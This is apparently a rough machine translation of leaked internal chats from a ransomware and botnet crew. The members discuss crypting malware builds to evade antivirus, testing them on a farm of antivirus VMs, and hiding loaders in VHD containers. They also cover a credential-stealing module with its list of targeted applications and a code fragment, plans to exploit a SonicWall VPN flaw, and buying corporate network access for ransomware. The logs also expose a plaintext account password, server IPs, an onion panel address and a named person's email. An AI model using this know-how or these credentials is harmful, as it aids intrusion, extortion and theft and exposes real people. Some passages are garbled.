hi
i've handed out all the std's, i've got some left for the crypt, but i'll have to do it again.
With Az there is nothing on your mind?
i need more downloads or bots on other software to work out
i also heard that there is a topic going on now about VPN access to the networks
I need to find a provider.
Okay, I'll give it a shot.
Hi. I need in a very short time to bolt in the resolve section the possibility of importing actors from bad
I noticed one peculiarity. From 25 to 29% most of the aces start flying into bad. That said, though. Up to 25-29% just most of the shares go to good. Maybe this is some kind of feature of the software and the shares are really invalid, but I want to check this in another way
It seems that the software, which is responsible for resolving, in the first place processes valid and "fat" aces, leaving all the junk for later. At the same time, from what is left for later, still little by little appear valid shares with unique soaps on them. Then the question is, how does the software do this?
It's been on all the tascas without exception.
Just do the tagger and his bk.
on monday we need to get it knocking.
yes
everything else is there, on coders you don't have to actively coordinate, the main thing is just the bk and target.
on monday the guys have to work
he's got a lot of work to do.
You set it up yourself, control it.
Encryption maybe.
or whatever.
Hey, are you there?

Hi, i was thinking about servers yesterday and i was wondering if all secure servers have either a channel limit or no dedicates) if i could get 2+ servers or as many as i need to bypass the channel limit (like 15TB per box) and do a lowad balancer on compromised hosts or look at ppsx, but instead of crypting out the entire disk i crypt one section and keep all files there
as i understand most operations happen in memory anyway, only custom nginx etc on disk.
hello, i was thinking yesterday about servers, my thoughts are all servers convenient in terms of security have either a channel limit or there are no dedicates) is it possible to consider the following solutions - instead of one server take 2+ or as many as necessary to bypass channel limits (there seem to be 15tb per box) and make a lowad balancer on compromised hosts, or look towards vpsok, but instead of crypting the entire drive to crypt one section and there store all files
As I understand most of the operations still happen in memory, on disk only custom nginx, etc.

hi

Hi) just wanted to ask
What does "Lero" and "Dero" mean? I have been racking my brains, it's not "Lera" and I can't think of "L.e.r.o.") Def also does not know))
it doesn't mean anything )
first there was Lero ... and then a new project ) what is it ... well dero )
0_0
well, it's possible to draw Dero by the ears to the post))) but Lero, how come?
i really wanted a clue, but it's a bummer)))
there's no clue
you came up with the word somehow, it's spelled from right to left, you just can't make it up on the keyboard
You can call it by your own name.)
It wasn't me. It was a former taskmaster.
I'm asking ... what should we call it? ... Lero.
yes i can, i just like puzzles and this name is one of them)
Oh, so Stern might know then?
No. Stern doesn't know. It just gives money.
He doesn't care... as long as it runs smoothly.
Oh, I get it. Who?
Hi! What's up?
Another guy. I haven't seen him in a long time... 4 years out of 5)
((((((((((((( he took the name of the project with him?
what a bummer
)
i have this project in IDE called x-t just got it somehow) .
how's the erlang code for you ?
the project is cool by the way ) def recently let me put it on the server, it works
what to do with it ) ...
erlang listen, it's not for my kind of mind, but it works)
when i started - i had a headache, but then it cleared up... now all the for/next/switch stuff -- it's so lame.
why did you choose yerlang by the way?

i don't know... i wanted something new. it was getting hype at the time. i decided to go for it...
I see) tough language, what can I say
For a year I switched from php to it... Then it just sort of fell into place... for 7 years now there's nothing but it.
no. very easy
й
You can learn Yerlang in 2 weeks.
So you can learn 25 erlangs in a year.
although listen to the opposites too, for example the rails should be readable, but to me it's kind of blurry -- like the socket in sight and what's behind the wall
hahaha well yeah about 25
And that phrase is very Yerlang, I take it?
no it's just a local joke.
https://www.diary.ru/~casus-white/p19192326476.htm
https://lionet.livejournal.com/58243.html
that's a good one.)
You can find me on the internet. I'll give you three guesses.
you write your e-mail address in your comic book. what's there to find you? )))
and into the code!)
sergey lognuts)
fuck!)
src/filter/filter_parser.yrl
3:"%% @Author: Sergey Loguntsov <loguntsov@gmail.com>"
well tk)
so three tries too many ))))
fucked up ... copypaste from may 5, 2020 )
whatever )
i must have fooled half of the world on erl )
hahaha
i think so)
about two years ago... i met an irlangist too... he was like... "oh, i supported your code after you"... it was nice...)
and wait you mean outside of the trike?
yeah
like with tric you're sure to run half the world through the servers))
on yerlang
what is a tricks?
you know the data is sent to lero)
i don't know what you call him
aralita no?
i don't even know the purpose of this software
well, analytics)
> like with trike you sure ran half the world through the servers))
and what do you mean by that?
there's a lot of data going through it)
data*
it's just something they collect . i don't know) my job is to take it and put it in the database ... what does it do i don't know
that's what I'm saying, they're collecting analytics
for advertising purposes)))
what is the purpose of this anonymity of the team at all?
i don't know)
ask Stern.)
don't want to )
there's not a lot of work to be done on this side ... i don't work here anymore ...
+ you showed up
how much
 hello
https://privnote.com/RjwjqpJL#MVbMcSTxU
so consider that my code is your code.
haha ok, i don't write yellang
are you being paranoid?
i don't know who i was talking to about the erl guy? was it you?
i don't think so )
alright then ))
That's what I'm saying.
i was just wondering
do you think Leroux will try it too?
if its performance is good enough it'll work ...
they say go will be more productive
I don't know how to write parallel things there... but for Lero nothing so parallel is needed . so it will work on go too
Go's beauty is that to make a parallel function you just write go before it
the essence of erl is that you can build 100500 processes and feed information between them ...
and the virtual machine itself makes the threads under the OS)
OS threads are not the same as in Earl
it's the same in go but with pipes)
i'm saying... you can go too if you know what i mean... there's not much logic there
listen def ask to test the lock by ip
test it)
but how? on lero
The rules should be described in the database
SELECT type, filter FROM client_filter
here
<<"true">> => true,
<<"false">> => false,
<<"id">> => client#client.client_id,
<<"client_ver">> => Client#client.client_ver,
<<"name">> => Client#client.name,
<<"group">> => Client#client.group,
<<"ip">> => Client#client.ip_parsed,
<<"country">> => Client#client.country,
<<"sys_ver">> => Client#client.sys_ver,
<<"importance">> => Client#client.importance,
<<"userdefined">> => Client#client.userdefined

Here are the reserved words for meanings
Yeah, I got it. I'll check it out.
here are the descriptions of the expression language .
but i don't know ) may not work
oh my gosh)))
DSL is great.
no doubt
Okay, I see what you mean.
is there a simple way to add this to the database?
what exactly "it" ?
by hand with a sql query.
I don't know about anything else.
I get it, I mean, the rules, only through skool, there's no utility?
no
I don't do interfaces.
Got it. .
Well, you have to do a table update through the console.
Otherwise it won't come up in memory
I've done the migrations.
No. I meant when the server is running.

.PHONY: update_filters
update_filters:
	erl +pc uni
this one?
Yeah, something like that.
Ok, I'll look at it.)
Listen, why does it respond to my test queries forbidden?

Hey, I need flawless.

hello
     As you know Hh c August 1 introduced new rules, the cost of one summary on the site now costs 60 rubles, not including the purchase of access itself!
    Our company had a paid access on old tariffs till 01.02.21. After long negotiations with Hh, we managed to agree about preferential terms till summer, but the price of access increased and set the limit of monthly hits.

    It is important to understand that now there is a new stage in the work with resumes, ALL job sites have introduced charging by the number of open contacts. And Hh introduced a lot of restrictions: viewing limits, restrictions in creating new offices, increased control of the Security Service, etc. Plus 90% of suppliers blocked or ceased to transfer their accounts to 3rd party. Also in February many companies switched to new rules. Because of all these reasons offices on hh became scarce.

    Hh.ru (From 3 hours per day, time in Moscow to choose: 08:00-12:00, 12:00-15:00, 15:00-18:00, 18:00-00:00, 00:00-08:00 *Discount 10% for this time)

    30 resumes per day:
    - week: 7tr
    - 2 weeks: 10 tr
    - month: 15 tr

    50 resumes per day:

    - month: 12 tr.
    access is getting expensive. i need the one 20tr a month. who pays?

Why didn't you trick me?
By 11:00 a.m.
Didn't make it by then.
я
sucks.
I should have arranged it with everyone beforehand.
We'll do it on Monday.
That's understandable.
There was no one last night.
We had to be there by 11:00 tonight.
Who's needed there besides Hof?
To give me the file.
There were problems with the crypt and the source.
you didn't write me anything yesterday
who?
Target has his own crypto.
and he's been here since 7:00 in the morning
waiting for you.
I thought he had a crypt
<Stern> we should give target a trike
[19.02.2021 03:08:46] <Stern> crypted by our crypto
We did the crypt.
if it was just a build, of course we would have made it by 11
you contacted him.
text him that there is no crypt?
That's stupid.
What's his toad?
target@
you should have gotten the toad yesterday.
Prvieth
Prviet
I don't have him online.
 <smtbrowser@thesecure.biz> I'm from Stern on behalf of Dooms, I need a trike with an admin and a build
Isn't that him?
You were written to by a coder from Target
Who should have been given the tricks.
It doesn't matter if it's crypto or not.
If not crypto.
he's got his own crypto.

If it's not crypto, I'd give it to him by 11.
I thought he needed a crypto.
Why didn't you check with him?
You said the cryptors were ready.
Why wasn't the Bentley crypted by 11:00 today?
What does the bouza say about the crypto?
I thought they wouldn't.
"i thought."
You shouldn't be thinking.
You should always ask.
I understand.

[12:03:08] <Stern> and you said the crypto's ready
[12:03:13] <Stern> why wasn't bentley crypted by 11 today ?
[12:03:25] *** Unverified conversation started
[12:03:36] <buza> I'll fix it
[12:03:38] <buza> nobody says anything to me
we have 4 crypto
booza
our coders
there are ready cryptors
where did you write on the crypts?
What were the problems?
All of ours
rjve rjyrhtnyj
to whom exactly
There were problems with the dynamics was detected on the def after 15 minutes
to whom did you write on crypto
I made vani and kryptor from kryptopanelei myself
Hi
Why didn't you crypt the file by 11
It was important.
What are you doing now?
other than that task.
in general.
if you fuck up one more time i will remove you from the toad forever
or if someone else fucks up, but I'll give you the task before that
so don't just answer for yourself
but for all of them.
i got it
hey

I was texted at 11:20.
Hi

Here, add this.
he'll throw you the corps right now

Hey, .
How are you doing?
You getting good at it?
I'm just finishing up their practice booth.
Hi, I'm doing great.
Well, I also made a backdoor based on the legitimacy software.
Yeah, I learned a lot.
♪ now we're gonna run it on the rant ♪
♪ with bunts ♪
but there's a lot to learn.)
kind of like an intermediary lock.
recently jammed the network
because nets fall off sometimes and you do not want to crash the one at the alter
Tim Weaver, remember?
here on his analogue made
I'll show you the rant when we finish testing
I've got the lab for the newbies, I've got the tuning done and the only thing left is the manuscript.
It'll be easier for them to learn
I checked with Doomsday.
i'll be gone for an hour and i'll be pounding the corps.

I'm still working on the output, everything will be proxied through pxp, shorten the link, it will be fine.)

this also does not work(( i create an eche works
I create a dll (maybe I created it wrong or something else is needed) does not work until ret = MessageBox(0, "0", "0", "0") and that's it... but no error like a resource is not found

Hi
hi
Here?
Here
I have an urgent question to solve.
What, what's the point.
First, explain how you work, so I understand that I can count on you or with the other to negotiate
I usually check the rocket at 2 or 3 PM. Then if there are no requests and messages, I go do the main package shuffle, today I'm trying to restore this mode to start earlier. I have 4 hours worked today.
Yesterday, the day before yesterday, I was on all day almost going in nothing much
I have a package task to complete, I have 2 more days of 8 hours of work to do.
Then I plan to move on to code support instead of doing these packages.
I'm being rushed with packages, I'm prioritizing them.
The last few days I try to be online and reply to you in particular if I need anything.
With Stern and Botlist I promptly decided just today disappeared, because I want to cope with the mode and get up not at 2 Moscow but earlier.
The priority on packages also means that I sit at night.
I just got the data from import to pink last night and I figured out how to debug the supervisor with german, I put a lot of effort into it very much.
I need you in the afternoon and evening, at least from an hour or two in the afternoon, as I need to resolve issues promptly
It's kind of up to you to decide how you want to be. My situation is like this.
I have eight hours of time. I was explained 50 for packages 50 for you, if you are not there in the morning, I do not sit and wait just make packages and go to this process
50%
My tasks are my priority, then everything else.
you can discuss this with sylver and stern.
because the admins are raw and sometimes something falls off
now it's urgent to figure out if the data goes to the pink module network and accesses
Kk. I'll clarify this point tomorrow.
[22:43:36] <defender> my tasks are priority, then everything else
[22:43:45] <defender> you can discuss it with sylver and stern
[22:43:55] <defender> because admin windows are raw and sometimes something falls off
[22:44:06] *** Attempt to start a personal correspondence
[22:44:19] <defender> now it's urgent to understand if the data reaches the pink module network and access
are the messages coming?
let's write to the rocket.
Let's go to the rocket.

 On the last countdown point, you can see by the dates when the work started.
There's a clear four-day break.
the bots are going, the work won't get done if everything stops before the confab day
why are you twisting this around? we don't have a day to test the new system why are you cutting everything off if i didn't say sap is not my sap is my sap bro
 They have 60 bots on them.
Well look, the logic is simple.
-about six of them after the break.
That's 54 bots.
I have no bots, there is no point in sending them I turned them off
in a week
it makes sense
You just gave me screenshots.
I'll check with our friend
Why does he say there are no bots?
yeah i can see that bro
and for two days we were working without tds and fast flux files were flying out
he said there's no fuckin' way)
so i restored it i thought it was stolen again
Sap didn't know about it.)
I told him I'd stopped it.
It's kind of logical.
bro, i'll tell you right away if there are any problems there won't be any more
Okay. .

everything works, I fell asleep yesterday and did not pull info from a lot of bots - and there are probably 5-6 corps
or start now?)
yes let's do it now)
It's still 5:00 in the morning.
There were a lot of calls yesterday bro
Let's make it 7 a.m. at least

Hello
The problem was solved by simply adding more RAM to the VM.
Apparently the load was too great, 2GB which were originally not enough to handle
The lib worked.
The problem with lib was the lack of RAM in test 10. Everything's fine with the lib.
I was too hasty with RAM, sorry. Reduced it back - in the end lib started working anyway. In general, strange situation. The main thing now works.
I was too hasty with operative output and decrease it back - lib works, maybe there was a glitch with VM.
Who can help me figure out the sonicwall vulnerability?
And make a working scanner.
The problem with lime was the lack of oppertiva in test 10. Everything's fine with either.
I was too hasty with the oprative, I scaled it back and the lib works, maybe there was a glitch with the WM

but the supervisor doesn't start all of them
access is there with an error
I see
in the rocket reset the password e2e
I see that there's no space.
I can't install a new one.
I can't get a window.
Where there is no room?
There is no room on the auction
F yt
Not
it's old.
There is a place
but there wasn't
all scored the site logs
I deleted them.
Check the logs and see what's wrong.
Okay.
https://qaz.im/zaq/sNHrz8sY#tEZ544ys
So far everything is full of errors of access to this ip
Bp njuj xnj db;e/
From what I can see
and what kind of ip is it?
I don't see it on me.
Specified in the configuration domains_traffic_server.php
in general because of this should not fly, this ip does not work for a long time
it's a proxy
it has nothing to do with acces and botlist
I see. Logs are clogged because of it so I said
On the git 500.
I need it now.
Hi
https://privnote.com/mbeFKYEt#AZMzvMD0g
Are you sure this ip shouldn't work?
We've got, like, 10 Tasks linked to it...
I'm surprised it didn't clog up all the logs before.
Shade
Looks like the sphinx didn't go all the way up.
I don't get it yet but we have 5 different configs and different ports must have different sphinxes up
That IP is long gone.
It should work without it
Okay.
And you did this with mysql?
config?
I was there and then I uncommented it back.
Okay. .
I've got to get it up and running.
Well, I can see that it's not working.
people resent it.
I can't figure out where the service is
You've been building it from scratch.
Didn't you figure it out?
Doesn't it work for you?
No, I didn't figure out how it works on pingin.
You have to put a psi on it.
Yeah, put the psi in.
The git should be up now.

It's up.

Okay.
Duplicate in the rocket, the message is gone.
Duplicate what?
Well, you wrote about a client with no online
And you had access to it.
I wrote you about the Vntz.
It wasn't green.

kugio
what about the search error?
And online.
An unknown error has occurred.
still.
Yeah. I don't know.
We have a black which one is tied to it?
I see the logs are overflowing with crap
because that proxy isn't working.
And the password stopped working for the auction.
to ssh.
What do you mean the password stopped working?
Literally.
Did you log in today?
Try and get in.
Yes
It was working an hour ago.
Now I can't.
It's okay.
I'm there.
What does it say?
That's weird.
 password:
root@162.244.81.252: Permission denied (publickey,password).
https://qaz.im/zaq/yt25YTTQ#yeH6Qae3 is the password?
Yes
I went to .
Cleaned up the hosts.
I'm trying to figure it out.
I don't know how to fix it yet.
If you didn't change anything, why did it fail?
Something must not be running.
Yt pfgeoty cabyrc
look at the histories, compare with the other pink admin
Sphinx is not running.
it's not running what's running here.
Run
More precisely those parts of it that are responsible for searching
It is not possible to
maybe clean up the indexes.
Well?
?
I'm here, I'm doing it now.
I have to copy all the folders.
I'm asking you to hurry up.
People are sitting around waiting.
Stern told me to hurry up.
I understand, but I don't know what the problem is exactly.
It feels like it can't create any files.
If you look at the logs, prealloc: failed to open /home/storage_ex/access/0_100/20/access.lock: No such file or directory;
sphinx won't start in general
Azces seems to be working.
Let's fix that proxy?
Maybe some other IP can be set?
hi
Let me know when you're done, let's get set up
I'll check it out.
There's something else in the config
in the config, the admin is *.0.20.
Is it supposed to be like that? I think it was 2.
Let's go to the toad.
What's up?
We need to fix the proxy.
There's probably 100,000 lines of error in a second.
I just can't find the right one.
Botlist doesn't work.
It's working.
I can't see info for 1 client either.
Maybe there is some kind of ipi that can be used?
What is the ip in tinka for black?
20?
Or 2?
In the logs, I can't create a task for 20.
And I can't get a client.
Why did you set it to 20?
Which black is tied to the auction?
Anyway. I don't know why I can't hang a task through the tick.
And I need a proxy ip for domains_traffic_server.php or settings in general
Api_key for example.
I can't continue today. We'll finish the setup tomorrow.
Access is working, why the rest is not working I do not understand yet.
The botlist was working too.
Are you there?
Did you start the indexes from scratch?
The botlist was working too.
Are you there?
Did you run the indexes again?
Yes
I got confused.
With the process.
To get rid of it, you have to stop the errors in the console.
And there's something wrong with the black.
Either a tink needs to be adjusted or black needs to be reset.
I'm done for the day
What do you mean that's all for today?
You've had your day.
You need to fix your mistake.
That's not how it works
That IP had nothing to do with it if it worked fine.
You had plenty of time to figure it out.
It turns out that every time you look at it, it's like the first time
The question is why
I counted on you, I promised people, and you just bailed.
That's not how we work.
Either you work for results
or I'm looking for someone else.
It's simple.

Okay, I'll talk to sylvester tomorrow.
About that.
If that's the case, you'll be looking
I'm expected to make a decision right now.
Can you decide now?
I'll hand over the files and that's it. I can't today.
They said eight days off.
I just came by to see how things were going.
I did what I could.
I do not want to argue about who is right and who is wrong. Tomorrow we'll decide with sylver, if I can not cope within the limits that you set there is no point in continuing.
He says one thing, you say another.
I understand that for you it's a new software and everything, but you had a few months to get into it all, how it all works, and get it all you look at it all like the first time, and we can not solve the problem quickly ... that's the problem.
Now we need to raise the software is a priority, and what about Silver, people are sitting and waiting, Mawelek did it in 1-2, I understand that for you it's a new software and everything, but you had a few months to get into it all, how it was all set up, but you look at it all as the first time, and we can not solve the problem quickly ... that's the problem.

What is the point of this proxy?
It checks domains as I understand it.
It checks for headers.
You mean it's hiding requests behind it?
Yes, it's a curl to get the data on the domain in question, with which the log is now overflowing
Did you manage to write out the ipi?
Yes, thank you! They go, but others, these I will fix myself.

Hi.
I told Buse all about the situation with the vault.
About not working, I don't really understand the question. On what day exactly.
I don't understand about missing either. There are 8 hours of work time that I originally agreed to. I worked more than that yesterday, finished the job and left.

Hi
https://privnote.com/aDJgG9ZE#GjemwUGAy
Today's (11-03, Thursday)
Hi.
Here's my message to adam, about the whole vault situation since you wrote I want to clarify the issue of expectations, responsibility, boundaries and priorities.
Regarding the whole vault situation, here's my position.
1. I for one do not agree with the idea that I have to be on call 24 hours, I have sold 8 hours of my time, and sometimes I stay late at work if I want to, but that is my free will, I won't, I won't. I agree with you that I need to adjust my time, I'm looking into that, I'll try to work it out and be on call during my msk business hours, I generally have trouble sleeping. It's not your problem, but I think it's good for you to know.
2. I got the indexing part as far as I remember about a week ago is the storage_ex repository. I don't think it's my responsibility to know all the repositories I need to learn, if I had it before then the situation where I look at the code and don't understand how to work with it probably wouldn't be so fatal.
I think it's my responsibility to figure it out and solve the problems, and I think I'm up to it because of my ability and speed.
It's your job, and the other intinitiators, to give me access, code, servers, and whatever else I need to work effectively, I don't think it's perfect with that, so the responsibility here specifically is yours.
I think the situation where I can't resolve the issue quickly is normal given the conditions I find myself in. I'm not Mav, I'm a different person, I try to do my job and put in enough effort.
I'm not going to work my ass off, working "to the result" and around the clock - a direct path to burnout, if you think that I - a function, I do not agree with this approach and will continue to insist on it.
3. any threats in the spirit of - I'll find another coder, or hanging obligations that I did not take - does not lead to effective work, rather the opposite. There are agreements, and there is a dialogue as a way to solve problems.
Z.U. I, like any coder, probably feel more comfortable working at my own pace, and when I'm driven somewhere, or do not give time, I can not solve my problems well, it is clear that the special conditions I have not promised, but if there is such a possibility, I'm for planning and discussion. Duplicate this message to Stern and Silver, otherwise somehow it is not clear everything.
Ready to discuss the situation.
Hey, is this about the search?
Yes
 Now in this admin that search was messing up yesterday https://auk64p35qeb half the logs are gone
I did not pay attention to what groups, but for example yesterday the bots for one link were 375, today they are 45 for the same link
1758BB12FF990BBF3878132B2BB0FF77 here is a bot for example
It had a lot of links and now it's empty
I don't see what botnet it has
3:54 PM
Maybe he rebuilds indexes, ask him.
Here's another problem.
it's not user06.
It's 04.
Ok. I'm looking at it.
Please send me an example of a bot with links.
In which column are you trying to see the botnet?
And by links, do you mean info on the client page, or when you click on Brow Access info?
Yeah kinda
I asked the guy.
 When you click on Brow Access.
PINC-D003_W10018362.1758BB12FF990BBF3878132B2BB0FF77
bot as an example. botnet NET: mor9
This bot lost all access from Brow Access.
Yeah, I checked the database. It's not on the site. I'll try to reindex it.
Okay.
There won't be many links there yet, I'll figure out what's going on, I'll get it back
Got it.
Hello
Find me .
I reindexed it.
I see that didn't solve the problem.
Hmm
I think that tomorrow I will think on fresh brain, in fact in the database these logs have to understand why they are not in the index, I will address this as a priority.
Got it. Thanks.
I'll let you know the results by tomorrow night.
Okay. .
Here?
Yeah.
rob28 to the new one.

They're both inactive anyway.
That's why I got confused.)
Hey bro. Can I write to you if the pink admin doesn't work?
auk64p35...
Hi, yes, what exactly is not working?
Yeah, I can see it.
Yeah, they're saying "she's fucked." Can't seem to get in.
Logging in works, search doesn't.
It's been dragging on since yesterday, huh?
It was still working yesterday when I left.
Got it. Yeah, they say the search doesn't work.

Fixed it.
So i guess this kind of hard reindex is really stressing the system. I will have to look for another way to fix it. I will have to deal with logs that are missing now. I will write when I figure it out or if it takes too long, I will write progress.

Hi.
I raised the dnog and the auction
Greetings. Working with me on the crypto. Crypting the load, cleaning up... Refining the algorithms.
Yeah, great.
I am solving the problem with missing logs, I need to make a checker to check what log got into the admin area from the base and if it didn't write it down. I will finish it today if I will not have time on weekends
Hi, I'm working on it little by little. There are some bugs with certain builds. Works on 7 does not work on 10. How to organize debugging is unclear.
Thanks. Waiting for
Prvieth. Worked well with Van on all the ript tasks for Leo All week at 15-20 crypts.
Every day.
Afternoon. Put a small dot in wibinject. Poured the release into the admin area.
good
fuck
whose crypto?
how's it going?
hi
Doing support for zeus format for webinject setup
Working on content (vhd, vhdx) with Franz. I want to hide the load in unused container sectors
A few more thoughts on running code from a text file.
All in the container topic
Crypting out what to give. So far I have used bentley. Crypting coba, load from cesar, were bots/loaders. Added twin the other day, will crypt something from it.
hi great
Hi, I'm at war with Avast. It's detecting the injection for all it's worth.
Hey, how's it going, any results, successes or failures?
Yeah, great.
ok
Hi
Hey. Okay.
 Working quietly! :) to the plant new connections in the team.
great
with whom
weldon, jonnyboy77 :)
Yeah, and with Franz, we communicate more.
Just do not say that the luntik should give wages, his salary went to pay off debts that he had accumulated there under the guise of the fact that I did not finish what they say. Reverse write - he will confirm that this scoundrel bribes them there
[11.03.2021 07:26:27] <revers> well I told him the same
[11.03.2021 07:46:19] <revers> we fucked up enough for him too
)))
yeah kevin can do that too
ok
there's a payday on pd. will you be in touch?
or we'll do it now?
hey, bully.
Have you seen my container?
Hey, I got it.
Yeah, I'll be there.
Hi
What's up with the vault? Why isn't the search working?

the vault search doesn't work
♪ the users write ♪
here?
the problem is
the tricks aren't uploading.
auction?
I'll take a look now.
Is there any example to reproduce the problem?
I see the botlist, I fix it.
Reindexed it, it's ok, is it working as it should?
hz
I'll check it out.
about the av that you asked
I have written to the request - they promised to send instructions to the mail how to buy. have not sent. They have been calling for three days and can't get through...
fuck
they're doing
i'm jerking them off
Hi, how's it going, post results, successes or failures

Hello, bro!
vladimir.tyrenko@mail.ru here is the post of the administrator who is ready to talk to
Hi. Here?
The pdf files themselves do not contain icons, the icon must be specified in the absolute path.
If you put it on the container itself, we don't know the letter to which the container will be mounted by Windows.
I took the icon from edge, but if it's not on the computer then there will be no icon.
There are standard icon packs which are always there, in shell32.dll for example.
Why don't we take it from there?
https://help4windows.com/windows_7_shell32_dll.shtml
I pulled the icon from the edge, but because of the unknown connection letter of the container turns out nonsense

tell me how you're doing on points of interest
hi
revers is very happy with the loafer i gave them as a result
[09:19:29] <revers> the coder is smart by the way )

Derek is quiet with the container, they are twisting something in the wiring.

The professor gave me a task to develop a software tool to download contact bases from date tags. I suggested a little development and add there a check for duplicates, live/dead on mx records mails and other small things, we will collect their date

Everyone's waiting for the paycheck, so I'm fighting back as best I can.)

The injector for the Zeus format is almost ready, by the end of next week the "remote" injector module will be ready

Made schedules for cryptors - so far we export entirely by our own forces, third-party crypts only derek orders for safety net

Stock of router pads about 1k! Want to sell already)

Collected bots crooked on vnts - presented to the coders - watch. Somewhere bots immediately fall off, as soon as you run - where browsers are stupid, white screen and all that.

Trick itself seems to be knocking very much, all modules are fine, imports
\The injector works fine, so does the stiller.
The AB is still not able to buy, they just do not get in touch. We are still trying to get in touch with them.
as for the coba crypts, everything is clear, up to 24:00 person is in touch, plus there is a second redundant one
and now almost ready automatic cryptor from elroy and faster
develop the container theme further - run the load from an untagged area out of memory! i.e. nothing is dropped from the container itself, so far everything is at the testing stage
I did not show this to Balzac because I do not know him
so far derek and one of the professor's guys have been living with it
I'll report back later
and I'll chip in some money.

hi
i can't see a fucking thing
:(
pwgrab only x86 version works
i checked it on cobalt and it's fine
don't know what's wrong yet, probably because of the size
hi
Hi
Fuck, I can't get it to work
Hi
what does the size have to do with it? you can use the side injector to tighten either one as i understand it or not?
Hi
I don't know but x86 version runs fine
I'll check it later.
I can give you what works now

quick question
Will x86 run fine on x64? )
or is there a difference in functionality?
Yes
Let's try it)
The main thing that the process where injected was the same digit capacity
mm-hmm
fuck
you can do it by spawning a randle of the right bit

Hi, I'm already afraid to write anything without OTR

Got it, have there been any new breeding vulnerabilities?
Hi, how are you doing?
Did you give up your VPN?
Hi
how's goose doing?
Hi
gus@ don't pay your salary
Hey, what are you crypting? Send me your crypto reports
Hi
what kind of crypto do you use?
What are they crypto?
Hi.
leo's van project aka bk lockers.
Hi. Did you manage to x64 the locker?
Bk still clipper, elon, cosmos
Hi
I'm in the middle of something else.
I'll probably check it out tonight
How are their results?
cobai lokers - cosmos
on their crypts
and where do you check them?
The best one is van.
We check on the dincheck for statics. And the merch checks his own tap.
Best of all, show me dyncheck's test results.
Dynamics and statics.
and def how do you test
https://dyncheck.com/scan/id/cad102c21de5a13942b7a693bf55919e
Typical Leo results
to run on vm
give me the log pass
benalen@exploit.im
DH*&HKDbs*&TGLksg87whnw40utji$
from the ding check.
Yeah, that's him.
BC is checked for statics and startup on VM by other testers.
Koba we check statics + tapping + def.
Also lockers. Static + def + runability on the VM
and how do you check for defender?
There was a system.
Yeah, but it's not set up yet.
Hey, how do you check
Files that give out
Describe the algorithm.
so far the farm only works in corp av mode for dynamic and static test
what kind of a farm
describe it
and what's wrong with def, why isn't it fixed and when it will be fixed
Virtual machine server on linux there are about 50 VMs with different antiviruses.
I will take up the issue of debugging the def.
Hi what is a farm?
and is there a bunch of defenders?
machines
In the meantime, the admin to manage it all
https://43oxsnqlub6aydymkwpn3agaaj7u2qexx4vwybgrwug46c6yldhuheid.onion/crpanel/
admin
https://qaz.im/zaq/T7YQ3GaA#9TQGK9yK
This is the cryptopanel where the files are uploaded and where the tests are run
https://195.123.214.177/phpvirtualbox/
admin
https://qaz.im/zaq/HNZeaBrb#ah7eea69
This is a VM server
There are 21 machines in Machines
not 50
What is first and second?
so
There's a list of machines on the VM server
https://195.123.214.177/phpvirtualbox/
which is
Cryptopanel proxy https://173.232.146.104 is down, please call system administrator. Automatic tests are disabled.
what it is
It's a bug in the pads. Resolve
How long has it been like this?
Yesterday the autotests worked with the corp av
Where are the test results from autosystem for the last 2 weeks at least
in uncrypted there is a file eicar.com it has tests on it.
VM dont'get file in 10 min
That means VM didn't get the file.
i want to see for the next week every day how you check the files on the auto farms
Got it
Every tester has to use the system
understand the system
every day to use it.
That's what it's made for.
and to fix it.
I see.
Hey how are you doing on the reverses ?
let's run the vulnerability on the VPN which is sonicwal
it's on the internet and maybe there's even a code
Hi
you can get the testers to tell you about the autocheck and what needs to be changed you can tell the booze or the admins
and get them to work on it.
and keep an eye on it.
if there's anything else you need to tell me.
I got it.
Hey, what are you crypting? Send me your crypto reports.

Hello
I'm here to see you about the hacker access.
I've got a guy on the line, gives me access with AD, but we can't agree on a percentage.
you can work with cylance? brb 10 - and to this I do not know what to answer) and the professor is not, usually he explains everything to me
Oops, I'm by the way ssupport C, general manager of the team\trick\locker, now here looking for access to work for the gang, well, and in general on the farm still no C
[Error: the message is encrypted and can not be decrypted.]
The situation is like this, I have a friend Kerberos on the forums, he where the 404 nickname. He has a partner, like a Spaniard or something, but he has long been in you since the days of ds. They have a lot of access, fat, all with hell. With says accesses with AD we work for 25. Without AD - for 15 in their direction. Well, maybe 20 will take if they are just a lot and at my request, like my friend. They stubbornly refused that this is not enough, they even offered the following: they give access, we pick up the date and lock + negotiations. We like 35 ip 65. I all explained, all that C said passed, the bidding, there and then, korochey offered them so that once the surplus is at them - we can get for 20 without AD now. Well, and maybe for 30 with AD. I say so and so, we have cooler software and a cooler team, let's try it, maybe the percentage and less than others but we will surprise you with payments)))) In general to what all it. <Stern> well, hors can get it for 30

Hi!
Hey bro, if you're in touch, let me know.
Hi. There's an update on the module.
Can you add something?
Would you translate these over here, please?

Hi
Yeah, what?
+
Did the decryptor take it?
Here's the addition:
Build applications can be passed to the module via the command line:
-f <output file>
-a <grabbed app>[,<...>...]\r\n");
apps: Firefox, Chrome, IE, Edge, Outlook, Filezila, WinSCP, VNC, RDP, Putty,
      TeamViewer, Precious, Git, OpenVPN, OpenSSH, KeePass, AnyConnect, RDCMan
Example: -f out.txt -a chrome,winscp
Here is the wrapper:
  const int CmdLineSize = 200;
  char *CmdLine = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, CmdLineSize);
  CmdLine[0] = 0;
  for(int i = 2; i < argc; i++)
  {
    strcat_s(CmdLine, CmdLineSize, argv[i]);
    if(i < argc - 1) strcat_s(CmdLine, CmdLineSize, " ");
  }
s((HWND)&OutputData, (HINSTANCE)&OutputSize, CmdLine, SW_MAX + 1);
Got it, thanks
Ok
I'll do it now.
Do you have it ready yet?
Hey bro, if you're in touch, let me know.
Send me the module if it's ready, I've already implemented the transfer of arguments just need to pass to your function
Hi!
If anything, in the chat room.

Happy update:
A:\Project\pwgrab\Bin\publish\sg1.4.2021
Dowload URL:
https://file.io/0FRsvyxDS51A
Pass:
(YY%DIA1GsC^N_m&nE3)
Oh, look.
It's okay, though.
If anything, write. There's a lot of modules there, pick the ones you want.
And you can do it in utf 16 cmdline?
You could, in principle. Will rundll32 also pass in u16? Probably need to do as there, because the module is run differently.
I could not find WCHAR* being passed to rundll32.
You can regsvr32 use wchar there.
Although in principle, I can convert in the injector.
It's probably easier to do MultiByteToWideChar. I haven't seen it run through regsvr32. It is designed for COM.
You can run any dll through it.
Well, in general, yes no problem MultiByteToWideChar do
It works.

